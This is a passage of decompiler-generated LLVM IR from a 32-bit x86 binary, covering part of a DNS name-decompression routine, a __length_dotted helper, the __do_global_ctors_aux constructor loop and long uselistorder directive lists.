  %v0_8054332 = phi i32 [ %v0_8054332.pre, %dec_label_pc_8054328.lr.ph ], [ %v4_805434c, %dec_label_pc_8054341 ]
  %v8_805432838 = phi i1 [ %v8_80543283350, %dec_label_pc_8054328.lr.ph ], [ true, %dec_label_pc_8054341 ]
  %v5_80543b837.in = phi i8 [ %v5_80543b83049.in, %dec_label_pc_8054328.lr.ph ], [ %v4_80543b8, %dec_label_pc_8054341 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8054328.lr.ph ], [ 0, %dec_label_pc_8054341 ]
  %v0_805432f35 = phi i32 [ %v0_805432f.ph46, %dec_label_pc_8054328.lr.ph ], [ %v2_805435b, %dec_label_pc_8054341 ]
  %v5_80543b837 = zext i8 %v5_80543b837.in to i32
  %v1_805432f = add i32 %v0_805432f35, 1
  store i32 %v1_805432f, i32* @esi, align 4
  %v3_8054332 = select i1 %v8_805432838, i32 2, i32 1
  %v4_8054332 = add i32 %v3_8054332, %v0_8054332
  store i32 %v4_8054332, i32* %ebp.global-to-local, align 4
  %v1_8054335 = and i32 %v5_80543b837, 192
  %v6_805433a = icmp eq i32 %v1_8054335, 192
  %v1_805433f = icmp eq i1 %v6_805433a, false
  br i1 %v1_805433f, label %dec_label_pc_8054364, label %dec_label_pc_8054341

dec_label_pc_8054341:                             ; preds = %dec_label_pc_8054328
  %v4_805434c = add i32 %v3_8054332, %v4_8054332
  store i32 %v4_805434c, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_80543b837.in, 64
  %v1_805434f = zext i8 %tmp to i32
  %v2_8054352 = add i32 %v1_805432f, %arg1
  %v3_8054352 = inttoptr i32 %v2_8054352 to i8*
  %v4_8054352 = load i8, i8* %v3_8054352, align 1
  %v5_8054352 = zext i8 %v4_8054352 to i32
  %v2_8054356 = mul nuw nsw i32 %v1_805434f, 256
  %v2_805435b = or i32 %v5_8054352, %v2_8054356
  store i32 %v2_805435b, i32* @edx, align 4
  store i32 %v1_8054381.ph47, i32* @ecx, align 4
  %v2_80543b8 = add i32 %v2_805435b, %arg1
  %v3_80543b8 = inttoptr i32 %v2_80543b8 to i8*
  %v4_80543b8 = load i8, i8* %v3_80543b8, align 1
  %v1_80543bc = icmp eq i8 %v4_80543b8, 0
  %v1_80543be = icmp eq i1 %v1_80543bc, false
  br i1 %v1_80543be, label %dec_label_pc_8054328, label %dec_label_pc_80543c4

dec_label_pc_8054364:                             ; preds = %dec_label_pc_8054328
  %v2_8054364 = add i32 %v5_80543b837, %v1_8054381.ph47
  %v1_805436d = add i32 %v2_8054364, 1
  store i32 %v1_805436d, i32* @edi, align 4
  %v10_805436e = icmp ult i32 %v1_805436d, %arg4
  %v1_8054372 = icmp eq i1 %v10_805436e, false
  br i1 %v1_8054372, label %dec_label_pc_80543d0, label %dec_label_pc_8054374

dec_label_pc_8054374:                             ; preds = %dec_label_pc_8054364
  %v2_805437a = add i32 %v1_805432f, %arg1
  %v2_8054381 = add i32 %v1_8054381.ph47, %arg3
  %v3_8054384 = inttoptr i32 %v2_8054381 to i16*
  %v4_8054384 = call i32 @memcpy(i16* %v3_8054384, i32 %v2_805437a, i32 %v5_80543b837)
  %v0_805438c = load i32, i32* @esi, align 4
  %v2_805438c = add i32 %v0_805438c, %v5_80543b837
  store i32 %v2_805438c, i32* @edx, align 4
  br i1 %v8_805432838, label %dec_label_pc_8054398, label %dec_label_pc_8054396

dec_label_pc_8054396:                             ; preds = %dec_label_pc_8054374
  %v0_8054396 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054396 = add i32 %v0_8054396, %v5_80543b837
  store i32 %v2_8054396, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054398

dec_label_pc_8054398:                             ; preds = %dec_label_pc_8054374, %dec_label_pc_8054396
  %v4_80543af = add i32 %v2_8054364, %arg3
  %v5_80543af = inttoptr i32 %v4_80543af to i8*
  store i8 46, i8* %v5_80543af, align 1
  %v0_80543b2.pre = load i32, i32* @edi, align 4
  %v1_80543b8.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80543b2.pre, i32* @ecx, align 4
  %v2_80543b827 = add i32 %v1_80543b8.pre.pre, %arg1
  %v3_80543b828 = inttoptr i32 %v2_80543b827 to i8*
  %v4_80543b829 = load i8, i8* %v3_80543b828, align 1
  %v1_80543bc31 = icmp eq i8 %v4_80543b829, 0
  %v1_80543be32 = icmp eq i1 %v1_80543bc31, false
  %v8_805432833 = icmp eq i8 %stack_var_-17.136, 0
  %v0_8054332.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_80543be32, label %dec_label_pc_8054328.lr.ph, label %dec_label_pc_80543c4

dec_label_pc_8054328.lr.ph:                       ; preds = %dec_label_pc_8054398, %dec_label_pc_805431a
  %v0_8054332.pre = phi i32 [ 0, %dec_label_pc_805431a ], [ %v0_8054332.pre.pre, %dec_label_pc_8054398 ]
  %v8_80543283350 = phi i1 [ false, %dec_label_pc_805431a ], [ %v8_805432833, %dec_label_pc_8054398 ]
  %v5_80543b83049.in = phi i8 [ %v4_80543b82942, %dec_label_pc_805431a ], [ %v4_80543b829, %dec_label_pc_8054398 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_805431a ], [ %stack_var_-17.136, %dec_label_pc_8054398 ]
  %v1_8054381.ph47 = phi i32 [ 0, %dec_label_pc_805431a ], [ %v0_80543b2.pre, %dec_label_pc_8054398 ]
  %v0_805432f.ph46 = phi i32 [ %arg2, %dec_label_pc_805431a ], [ %v1_80543b8.pre.pre, %dec_label_pc_8054398 ]
  br label %dec_label_pc_8054328

dec_label_pc_80543c4:                             ; preds = %dec_label_pc_8054398, %dec_label_pc_8054341, %dec_label_pc_805431a
  %v0_80543c9 = phi i32 [ 0, %dec_label_pc_805431a ], [ %v4_805434c, %dec_label_pc_8054341 ], [ %v0_8054332.pre.pre, %dec_label_pc_8054398 ]
  %v8_8054328.lcssa = phi i1 [ false, %dec_label_pc_805431a ], [ true, %dec_label_pc_8054341 ], [ %v8_805432833, %dec_label_pc_8054398 ]
  %v2_80543cb = zext i1 %v8_8054328.lcssa to i32
  %v3_80543cb = add i32 %v0_80543c9, 1
  %v4_80543cb = add i32 %v3_80543cb, %v2_80543cb
  br label %dec_label_pc_80543d3

dec_label_pc_80543d0:                             ; preds = %dec_label_pc_8054364, %entry
  br label %dec_label_pc_80543d3

dec_label_pc_80543d3:                             ; preds = %dec_label_pc_80543c4, %dec_label_pc_80543d0
  %storemerge = phi i32 [ %v4_80543cb, %dec_label_pc_80543c4 ], [ -1, %dec_label_pc_80543d0 ]
  store i32 %v0_8054306, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8054381.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_80543b8, { 1, 0 }
  uselistorder i32 %v2_805435b, { 0, 2, 1 }
  uselistorder i32 %v4_805434c, { 0, 2, 1 }
  uselistorder i32 %v5_80543b837, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 1, { 1, 9, 12, 2, 11, 7, 0, 4, 5, 8, 3, 10, 6 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, { 3, 177, 178, 23, 179, 180, 181, 22, 182, 183, 4, 184, 0, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 31, 6, 5, 32, 33, 34, 35, 36, 44, 37, 38, 39, 40, 41, 42, 43, 200, 7, 201, 8, 202, 203, 204, 205, 210, 211, 1, 206, 207, 208, 209, 212, 213, 214, 215, 113, 9, 114, 115, 116, 216, 217, 224, 225, 226, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 101, 102, 103, 104, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 10, 128, 129, 130, 131, 132, 133, 134, 330, 331, 11, 332, 333, 12, 336, 337, 287, 288, 289, 52, 53, 54, 338, 339, 354, 55, 13, 56, 57, 45, 46, 47, 48, 49, 50, 51, 170, 14, 171, 172, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 58, 59, 60, 61, 62, 63, 64, 312, 313, 314, 315, 316, 317, 318, 319, 15, 320, 321, 322, 323, 324, 257, 258, 16, 259, 260, 261, 262, 263, 264, 265, 276, 277, 278, 279, 280, 135, 136, 17, 137, 352, 353, 138, 139, 140, 18, 235, 236, 227, 228, 229, 230, 231, 232, 233, 234, 65, 66, 67, 237, 238, 239, 141, 142, 143, 144, 145, 146, 147, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 19, 162, 28, 29, 30, 148, 20, 149, 150, 348, 349, 350, 351, 240, 241, 242, 243, 244, 245, 163, 164, 165, 166, 218, 219, 220, 221, 222, 223, 334, 335, 173, 174, 285, 286, 68, 69, 70, 290, 291, 345, 346, 347, 71, 21, 72, 73, 74, 75, 292, 293, 76, 77, 78, 340, 341, 342, 343, 344, 79, 80, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 2, 94, 95, 96, 97, 98, 99, 100, 105, 106, 107, 108, 109, 110, 111, 112, 167, 168, 169, 24, 25, 26, 27, 175, 176, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 281, 282, 283, 284, 294, 295, 296, 325, 326, 327, 328, 329 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 49, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 48, 16, 17, 18, 21, 19, 20, 22, 23, 24, 44, 45, 25, 46, 50, 26, 27, 55, 28, 29, 0, 53, 54, 47, 30, 31, 32, 33, 34, 56, 35, 36, 37, 38, 39, 40, 51, 57, 41, 52, 42, 43 }
  uselistorder i8 64, { 0, 2, 6, 7, 3, 8, 4, 5, 1 }
  uselistorder i1 true, { 1, 4, 11, 3, 5, 6, 8, 7, 9, 10, 2, 0 }
  uselistorder i32* @edx, { 8, 163, 164, 165, 166, 167, 168, 169, 22, 3, 173, 171, 172, 2, 174, 175, 176, 177, 178, 179, 180, 181, 50, 54, 51, 52, 53, 182, 183, 184, 185, 186, 187, 188, 194, 189, 190, 191, 192, 193, 4, 23, 105, 114, 115, 116, 117, 118, 119, 120, 195, 196, 207, 197, 5, 211, 212, 213, 214, 225, 9, 6, 24, 106, 121, 122, 198, 199, 10, 200, 201, 202, 123, 124, 125, 126, 127, 128, 308, 309, 310, 311, 11, 312, 313, 231, 232, 57, 55, 233, 317, 318, 325, 324, 315, 88, 12, 89, 90, 91, 92, 93, 94, 95, 56, 236, 237, 13, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 14, 251, 252, 234, 235, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 15, 74, 75, 76, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 16, 290, 291, 292, 293, 294, 295, 296, 320, 77, 215, 216, 218, 1, 170, 217, 87, 129, 203, 204, 205, 78, 206, 130, 131, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 21, 149, 150, 132, 151, 17, 152, 153, 155, 18, 156, 157, 158, 159, 160, 49, 19, 154, 316, 208, 209, 210, 20, 161, 226, 227, 314, 162, 319, 224, 321, 307, 0, 228, 229, 79, 221, 230, 80, 322, 323, 81, 82, 83, 84, 85, 86, 96, 97, 98, 99, 100, 101, 102, 103, 104, 107, 108, 109, 110, 111, 112, 113, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 219, 220, 222, 223, 297, 298, 299, 300, 302, 306, 301, 304, 305, 7, 303, 326 }
  uselistorder i32* @esi, { 222, 223, 224, 225, 226, 227, 35, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 36, 50, 51, 10, 7, 57, 52, 53, 54, 55, 56, 248, 11, 249, 250, 254, 251, 252, 253, 261, 255, 256, 257, 258, 259, 260, 262, 263, 264, 265, 266, 267, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 12, 151, 152, 13, 275, 276, 277, 14, 278, 279, 280, 281, 304, 305, 306, 307, 308, 309, 1, 310, 311, 312, 313, 314, 315, 316, 317, 126, 127, 128, 129, 130, 367, 368, 369, 370, 318, 319, 153, 154, 155, 156, 0, 157, 336, 337, 338, 66, 67, 68, 371, 372, 373, 374, 375, 400, 383, 386, 387, 388, 69, 70, 71, 72, 73, 74, 75, 376, 381, 382, 58, 59, 60, 61, 215, 216, 217, 2, 218, 219, 220, 62, 63, 64, 65, 339, 343, 15, 344, 345, 346, 347, 348, 349, 350, 340, 341, 342, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 351, 352, 353, 354, 355, 356, 357, 3, 358, 359, 360, 361, 16, 362, 37, 363, 364, 365, 366, 320, 321, 322, 325, 326, 327, 328, 329, 330, 331, 332, 333, 389, 17, 390, 391, 158, 18, 159, 38, 32, 323, 324, 111, 112, 398, 399, 160, 161, 162, 163, 164, 165, 166, 292, 19, 8, 282, 286, 287, 288, 289, 20, 33, 290, 291, 283, 284, 285, 91, 21, 92, 93, 293, 22, 294, 295, 167, 168, 169, 170, 24, 171, 4, 173, 174, 175, 176, 23, 177, 178, 172, 179, 180, 181, 182, 5, 183, 184, 185, 186, 187, 188, 34, 25, 189, 190, 26, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 27, 208, 209, 210, 28, 49, 191, 6, 192, 193, 377, 378, 379, 380, 392, 393, 394, 395, 396, 397, 296, 297, 298, 299, 29, 300, 301, 302, 303, 211, 212, 213, 214, 268, 269, 270, 271, 272, 30, 31, 273, 274, 384, 385, 334, 335, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 107, 105, 106, 108, 109, 110, 113, 114, 115, 116, 117, 9, 118, 119, 120, 121, 122, 123, 124, 125, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 221, 401 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_80543d3, { 1, 0 }
  uselistorder label %dec_label_pc_8054398, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80543ea = icmp eq i32 %arg1, 0
  br i1 %v1_80543ea, label %dec_label_pc_8054419, label %dec_label_pc_805440a.preheader

dec_label_pc_805440a.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805440a10 = add i32 %arg2, %arg1
  %v3_805440a11 = inttoptr i32 %v2_805440a10 to i8*
  %v4_805440a12 = load i8, i8* %v3_805440a11, align 1
  %v1_805440e14 = add i32 %arg2, 1
  %v1_805441115 = icmp eq i8 %v4_805440a12, 0
  %v1_805441316 = icmp eq i1 %v1_805441115, false
  br i1 %v1_805441316, label %dec_label_pc_80543f9, label %dec_label_pc_8054415

dec_label_pc_80543f0:                             ; preds = %dec_label_pc_80543f9
  %v1_80543f0 = add i32 %v0_80543f017, 2
  br label %dec_label_pc_8054415

dec_label_pc_80543f9:                             ; preds = %dec_label_pc_805440a.preheader, %dec_label_pc_805440a
  %v1_805440e19 = phi i32 [ %v1_805440e, %dec_label_pc_805440a ], [ %v1_805440e14, %dec_label_pc_805440a.preheader ]
  %v5_805440a18.in = phi i8 [ %v4_805440a, %dec_label_pc_805440a ], [ %v4_805440a12, %dec_label_pc_805440a.preheader ]
  %v0_80543f017 = phi i32 [ %v2_8054407, %dec_label_pc_805440a ], [ %arg2, %dec_label_pc_805440a.preheader ]
  %v5_805440a18 = zext i8 %v5_805440a18.in to i32
  %v1_80543fb = and i32 %v5_805440a18, 192
  %v6_8054400 = icmp eq i32 %v1_80543fb, 192
  %v2_8054407 = add i32 %v5_805440a18, %v1_805440e19
  br i1 %v6_8054400, label %dec_label_pc_80543f0, label %dec_label_pc_805440a

dec_label_pc_805440a:                             ; preds = %dec_label_pc_80543f9
  store i32 %v2_8054407, i32* @ecx, align 4
  %v2_805440a = add i32 %v2_8054407, %arg1
  %v3_805440a = inttoptr i32 %v2_805440a to i8*
  %v4_805440a = load i8, i8* %v3_805440a, align 1
  %v1_805440e = add i32 %v2_8054407, 1
  %v1_8054411 = icmp eq i8 %v4_805440a, 0
  %v1_8054413 = icmp eq i1 %v1_8054411, false
  br i1 %v1_8054413, label %dec_label_pc_80543f9, label %dec_label_pc_8054415

dec_label_pc_8054415:                             ; preds = %dec_label_pc_805440a.preheader, %dec_label_pc_805440a, %dec_label_pc_80543f0
  %v0_8054415 = phi i32 [ %v1_80543f0, %dec_label_pc_80543f0 ], [ %v1_805440e14, %dec_label_pc_805440a.preheader ], [ %v1_805440e, %dec_label_pc_805440a ]
  %v2_8054417 = sub i32 %v0_8054415, %arg2
  br label %dec_label_pc_8054419

dec_label_pc_8054419:                             ; preds = %entry, %dec_label_pc_8054415
  %v0_805441c = phi i32 [ -1, %entry ], [ %v2_8054417, %dec_label_pc_8054415 ]
  ret i32 %v0_805441c

; uselistorder directives
  uselistorder i8 %v4_805440a, { 1, 0 }
  uselistorder i32 %v2_8054407, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 133, 38, 134, 37, 81, 138, 139, 42, 47, 46, 135, 140, 141, 142, 111, 143, 144, 145, 146, 147, 148, 117, 48, 118, 119, 54, 149, 150, 49, 82, 55, 123, 56, 50, 124, 77, 151, 152, 153, 155, 112, 168, 169, 1, 65, 61, 125, 126, 78, 2, 66, 67, 176, 62, 110, 0, 83, 107, 84, 108, 85, 109, 57, 3, 122, 43, 86, 4, 5, 6, 7, 120, 8, 9, 10, 68, 171, 11, 12, 79, 13, 156, 157, 158, 159, 51, 69, 166, 167, 136, 137, 162, 163, 58, 59, 60, 14, 177, 70, 52, 53, 127, 128, 64, 15, 16, 129, 44, 17, 130, 18, 71, 131, 132, 154, 170, 175, 80, 19, 121, 20, 87, 90, 88, 89, 91, 21, 22, 23, 24, 25, 26, 27, 28, 29, 72, 30, 31, 32, 33, 39, 34, 40, 35, 92, 93, 73, 94, 95, 96, 63, 97, 98, 99, 113, 114, 115, 116, 100, 101, 102, 103, 160, 41, 161, 164, 74, 45, 165, 104, 105, 75, 174, 76, 172, 36, 173, 106 }
  uselistorder i8 0, { 40, 5, 8, 9, 41, 7, 6, 137, 138, 11, 145, 140, 141, 10, 143, 144, 142, 36, 146, 2, 3, 62, 63, 147, 148, 38, 150, 12, 14, 84, 83, 13, 42, 151, 152, 153, 95, 96, 17, 161, 157, 158, 156, 15, 159, 160, 16, 37, 162, 163, 173, 174, 175, 176, 177, 188, 189, 19, 86, 85, 18, 87, 88, 167, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 4, 184, 113, 114, 211, 115, 212, 215, 79, 43, 57, 80, 20, 214, 194, 195, 196, 64, 197, 198, 199, 200, 201, 202, 44, 203, 22, 182, 183, 21, 139, 116, 117, 58, 1, 32, 33, 34, 31, 0, 45, 46, 47, 118, 178, 77, 149, 168, 169, 164, 166, 165, 119, 120, 121, 122, 123, 124, 125, 23, 126, 127, 24, 128, 129, 130, 131, 132, 133, 134, 135, 60, 213, 170, 171, 172, 136, 154, 155, 65, 66, 25, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 81, 82, 89, 90, 91, 92, 93, 94, 59, 39, 179, 180, 181, 185, 186, 187, 26, 190, 191, 35, 192, 27, 193, 204, 209, 208, 28, 205, 206, 30, 207, 29, 210, 61, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32* @ecx, { 27, 6, 8, 26, 7, 120, 123, 15, 124, 125, 126, 127, 16, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 37, 42, 38, 39, 40, 41, 144, 9, 10, 49, 0, 50, 145, 59, 12, 19, 146, 147, 17, 11, 18, 148, 153, 154, 155, 156, 157, 169, 170, 171, 172, 13, 51, 1, 52, 60, 61, 31, 62, 150, 151, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 28, 88, 89, 90, 91, 92, 93, 29, 94, 25, 45, 46, 47, 48, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 20, 198, 173, 174, 175, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 21, 213, 214, 216, 217, 218, 215, 222, 158, 121, 122, 32, 33, 149, 95, 96, 97, 98, 99, 100, 101, 30, 102, 14, 103, 104, 105, 106, 107, 22, 23, 2, 3, 108, 109, 24, 110, 111, 112, 113, 114, 116, 117, 118, 119, 35, 36, 115, 220, 152, 221, 223, 224, 225, 34, 43, 44, 53, 54, 55, 56, 57, 58, 159, 160, 161, 162, 163, 5, 164, 165, 166, 4, 167, 168, 219 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054419, { 1, 0 }
  uselistorder label %dec_label_pc_8054415, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80543f9, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805442c = load i32, i32* @global_var_80590e8.258, align 8
  %v10_8054431 = icmp eq i32 %v0_805442c, -1
  br i1 %v10_8054431, label %dec_label_pc_8054442, label %dec_label_pc_8054436.preheader

dec_label_pc_8054436.preheader:                   ; preds = %entry
  br label %dec_label_pc_8054436

dec_label_pc_8054436:                             ; preds = %dec_label_pc_8054436.preheader, %dec_label_pc_8054436
  %v4_8054439 = phi i32 [ %v0_805442c, %dec_label_pc_8054436.preheader ], [ %v2_805443b, %dec_label_pc_8054436 ]
  %v0_8054436 = phi i32 [ ptrtoint (i32* @global_var_80590e8.258 to i32), %dec_label_pc_8054436.preheader ], [ %v1_8054436, %dec_label_pc_8054436 ]
  %v1_8054436 = add i32 %v0_8054436, -4
  call void @__pseudo_call(i32 %v4_8054439)
  %v1_805443b = inttoptr i32 %v1_8054436 to i32*
  %v2_805443b = load i32, i32* %v1_805443b, align 4
  %v10_805443d = icmp eq i32 %v2_805443b, -1
  %v1_8054440 = icmp eq i1 %v10_805443d, false
  br i1 %v1_8054440, label %dec_label_pc_8054436, label %dec_label_pc_8054442.loopexit

dec_label_pc_8054442.loopexit:                    ; preds = %dec_label_pc_8054436
  %v2_8054442.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054442

dec_label_pc_8054442:                             ; preds = %dec_label_pc_8054442.loopexit, %entry
  %v2_8054442 = phi i32 [ %v2_8054442.pre, %dec_label_pc_8054442.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8054442

; uselistorder directives
  uselistorder i32 %v0_805442c, { 1, 0 }
  uselistorder i1 false, {}
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 12, 29, 55, 56, 57, 58, 68, 69, 70, 71, 10, 72, 2, 67, 30, 59, 11, 60, 61, 62, 13, 73, 74, 75, 76, 77, 78, 14, 66, 64, 65, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 7, 5, 6, 8, 3, 63, 0, 42, 43, 44, 9, 16, 45, 46, 47, 1, 48, 49, 50, 51, 52, 15, 4, 53, 54 }
  uselistorder i32 ptrtoint (i32* @global_var_80590e8.258 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 28, 29, 77, 12, 182, 199, 78, 200, 336, 79, 80, 201, 81, 30, 22, 82, 26, 202, 203, 31, 32, 33, 85, 84, 83, 204, 141, 142, 21, 20, 19, 205, 206, 86, 207, 6, 338, 208, 339, 340, 209, 210, 341, 183, 87, 211, 330, 212, 213, 214, 88, 215, 216, 217, 343, 35, 344, 36, 345, 346, 218, 166, 167, 168, 158, 160, 161, 162, 163, 164, 165, 159, 7, 157, 149, 219, 154, 155, 156, 169, 170, 153, 171, 172, 173, 174, 175, 176, 177, 150, 152, 34, 221, 220, 75, 8, 222, 223, 347, 348, 37, 17, 89, 224, 72, 225, 331, 226, 90, 91, 227, 92, 228, 184, 229, 93, 230, 231, 178, 95, 94, 232, 233, 234, 97, 96, 98, 235, 236, 13, 237, 238, 99, 100, 239, 101, 102, 240, 103, 241, 104, 242, 105, 243, 106, 244, 107, 245, 108, 246, 109, 247, 110, 248, 111, 249, 112, 250, 0, 38, 1, 251, 76, 113, 114, 252, 253, 254, 255, 256, 257, 116, 115, 117, 258, 118, 259, 23, 260, 185, 261, 360, 262, 263, 39, 357, 40, 264, 358, 43, 42, 44, 45, 27, 46, 119, 47, 265, 41, 359, 9, 266, 267, 268, 186, 269, 48, 2, 349, 352, 120, 356, 332, 353, 270, 271, 272, 350, 351, 273, 328, 329, 18, 337, 361, 121, 274, 24, 275, 276, 277, 14, 278, 15, 333, 334, 16, 279, 280, 335, 4, 49, 50, 3, 281, 197, 198, 282, 283, 10, 151, 122, 342, 284, 123, 285, 124, 286, 73, 74, 287, 125, 288, 126, 289, 127, 290, 128, 291, 129, 292, 130, 293, 131, 294, 132, 295, 133, 296, 134, 297, 135, 298, 136, 299, 137, 300, 138, 301, 139, 302, 140, 303, 51, 304, 305, 188, 306, 189, 307, 187, 326, 327, 308, 190, 52, 53, 54, 55, 309, 56, 310, 57, 311, 58, 312, 59, 313, 60, 314, 61, 315, 316, 64, 62, 63, 65, 66, 25, 11, 67, 68, 191, 192, 355, 354, 317, 193, 318, 69, 319, 180, 181, 179, 70, 143, 144, 145, 146, 147, 148, 71, 320, 321, 322, 323, 324, 325, 5, 194, 195, 196 }
  uselistorder i32 1, { 429, 853, 241, 724, 854, 235, 855, 139, 856, 272, 857, 858, 70, 431, 430, 122, 228, 273, 274, 859, 243, 862, 391, 863, 864, 865, 242, 866, 255, 413, 157, 156, 867, 868, 433, 432, 181, 869, 434, 870, 435, 182, 871, 872, 436, 183, 184, 750, 751, 752, 753, 754, 755, 756, 757, 758, 440, 439, 438, 414, 437, 415, 148, 147, 146, 149, 759, 760, 442, 441, 416, 417, 171, 173, 172, 174, 176, 175, 319, 873, 874, 229, 318, 875, 876, 275, 877, 353, 878, 880, 443, 79, 0, 1, 884, 881, 882, 883, 244, 444, 102, 101, 885, 445, 72, 789, 790, 791, 276, 792, 886, 887, 888, 446, 188, 187, 185, 189, 186, 355, 889, 119, 277, 278, 29, 30, 28, 31, 279, 447, 32, 320, 256, 449, 448, 14, 15, 450, 190, 451, 121, 356, 452, 230, 893, 894, 237, 895, 280, 245, 246, 896, 897, 236, 898, 899, 900, 901, 902, 281, 455, 454, 453, 918, 919, 920, 921, 922, 923, 924, 925, 234, 257, 926, 282, 927, 928, 929, 283, 930, 931, 284, 932, 933, 934, 935, 936, 357, 426, 457, 456, 68, 67, 69, 321, 322, 979, 980, 981, 982, 247, 793, 794, 795, 458, 71, 459, 803, 460, 46, 47, 323, 903, 418, 191, 354, 804, 805, 806, 285, 358, 807, 461, 808, 286, 809, 810, 473, 472, 471, 470, 469, 468, 467, 466, 465, 464, 463, 462, 192, 201, 198, 195, 199, 193, 197, 194, 196, 200, 968, 969, 2, 45, 44, 43, 42, 41, 474, 202, 203, 475, 39, 40, 811, 812, 476, 133, 132, 134, 1040, 1041, 1042, 20, 21, 19, 813, 477, 158, 162, 163, 159, 161, 160, 814, 324, 480, 479, 478, 481, 86, 482, 483, 13, 485, 484, 97, 487, 486, 88, 488, 204, 489, 205, 490, 206, 491, 207, 492, 12, 494, 493, 11, 495, 130, 497, 496, 100, 498, 502, 501, 500, 499, 87, 1045, 1046, 1047, 504, 503, 23, 22, 325, 506, 505, 509, 508, 507, 208, 510, 326, 402, 723, 258, 516, 515, 514, 513, 512, 511, 209, 210, 1043, 519, 518, 517, 153, 151, 152, 359, 520, 783, 784, 785, 394, 786, 521, 136, 137, 135, 138, 327, 522, 65, 66, 848, 231, 238, 849, 419, 523, 35, 37, 34, 36, 524, 55, 52, 51, 53, 57, 56, 54, 62, 59, 61, 63, 58, 60, 360, 526, 525, 361, 527, 362, 528, 363, 531, 530, 529, 403, 534, 533, 532, 211, 364, 993, 994, 995, 535, 98, 996, 997, 248, 998, 999, 1000, 91, 89, 90, 404, 992, 287, 212, 214, 213, 365, 328, 761, 762, 763, 764, 538, 537, 536, 17, 16, 18, 366, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 288, 1010, 1011, 1012, 1013, 1014, 331, 1015, 1016, 227, 332, 1017, 1018, 1019, 1020, 329, 330, 1021, 1022, 1023, 541, 540, 539, 94, 93, 92, 96, 95, 333, 334, 542, 335, 336, 289, 546, 545, 544, 543, 124, 290, 405, 547, 548, 549, 550, 551, 552, 553, 554, 937, 259, 938, 367, 269, 368, 942, 260, 559, 558, 557, 556, 